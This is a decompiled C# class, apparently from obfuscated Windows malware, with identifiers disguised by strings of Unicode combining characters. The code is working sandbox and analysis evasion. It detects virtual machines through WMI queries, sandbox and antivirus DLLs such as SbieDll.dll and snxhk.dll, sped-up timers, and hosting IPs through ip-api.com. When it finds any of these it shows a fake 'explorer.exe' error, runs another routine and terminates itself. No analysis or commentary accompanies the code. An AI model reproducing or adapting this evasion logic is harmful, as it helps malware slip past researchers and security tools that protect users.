using System;
using System.Management;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200003F RID: 63
	internal class Class_46
	{
		// Token: 0x060000EC RID: 236 RVA: 0x00008624 File Offset: 0x00006824
		public static void pmethod_129()
		{
			if (Class_46.tmethod_132() || Class_46.xmethod_131() || Class_46.gmethod_133())
			{
				if (Class_84.\u0338\u0020\u030E\u0369\u0317\u0330\u0351\u033C\u0020\u0344\u0020\u0309\u0337\u035A\u0020\u0020aqwrqdordixflssi\u0020\u036B\u0316\u030E\u0349\u036D\u0317\u032E\u0020\u0357\u0020\u035B\u034A\u032F\u0306\u0349wwnvzprzhrfhwasd)
				{
					MessageBox.Show(Class_84.\u032F\u0329\u0363\u0356\u0304\u0320\u0489\u0309\u0342\u0326\u034E\u034E\u0332\u031D\u033D\u0315tofbfifqjjrmruqb\u0E47\u0308\u0E47\u0343\u0315\u0363\u0301\u0E47\u0331n\u036C\u0350\u032F\u0348\u0E47\u031Fohlxlrwsbdvwlucz, "explorer.exe", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				Class_81.smethod_240();
				Environment.FailFast("bye bye");
			}
		}

		// Token: 0x060000ED RID: 237 RVA: 0x00008688 File Offset: 0x00006888
		public static void smethod_130()
		{
			if (Class_46.cmethod_134())
			{
				if (Class_84.\u0338\u0020\u030E\u0369\u0317\u0330\u0351\u033C\u0020\u0344\u0020\u0309\u0337\u035A\u0020\u0020aqwrqdordixflssi\u0020\u036B\u0316\u030E\u0349\u036D\u0317\u032E\u0020\u0357\u0020\u035B\u034A\u032F\u0306\u0349wwnvzprzhrfhwasd)
				{
					MessageBox.Show(Class_84.\u032F\u0329\u0363\u0356\u0304\u0320\u0489\u0309\u0342\u0326\u034E\u034E\u0332\u031D\u033D\u0315tofbfifqjjrmruqb\u0E47\u0308\u0E47\u0343\u0315\u0363\u0301\u0E47\u0331n\u036C\u0350\u032F\u0348\u0E47\u031Fohlxlrwsbdvwlucz, "explorer.exe", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				Class_81.smethod_240();
				Environment.FailFast("bye bye");
			}
		}

		// Token: 0x060000EE RID: 238 RVA: 0x000086D8 File Offset: 0x000068D8
		public static bool xmethod_131()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060000EF RID: 239 RVA: 0x000088C0 File Offset: 0x00006AC0
		public static bool tmethod_132()
		{
			string[] array = new string[]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmdvrt32.dll"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (Class_22.dmethod_56(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x00008938 File Offset: 0x00006B38
		public static bool gmethod_133()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x000089A4 File Offset: 0x00006BA4
		public static bool cmethod_134()
		{
			try
			{
				return new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting").Contains("true");
			}
			catch
			{
			}
			return false;
		}
	}
}
